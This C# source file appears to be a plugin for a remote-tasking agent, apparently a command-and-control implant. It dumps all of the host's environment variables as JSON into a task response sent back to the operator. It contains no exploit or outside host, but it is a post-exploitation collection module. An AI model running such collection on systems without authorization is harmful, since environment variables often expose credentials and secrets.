using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;
using Athena.Commands;
using Athena.Commands.Models;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class Env : IPlugin
    {
        public string Name => "env";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            StringBuilder output = new StringBuilder();
            output.Append("[");
            foreach (DictionaryEntry fs in Environment.GetEnvironmentVariables())
            {

                output.Append($"{{\"Name\":\"{fs.Key.ToString().Replace(@"\", @"\\")}\",\"Value\":\"{fs.Value.ToString().Replace(@"\", @"\\")}\"}}" + ","); // Get values in JSON styling and escape \
            }
            output.Remove(output.Length - 1, 1); // remove extra Comma
            output.Append("]"); // add ending array


            TaskResponseHandler.Write(output.ToString(), args["task-id"], true);
            return;
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}
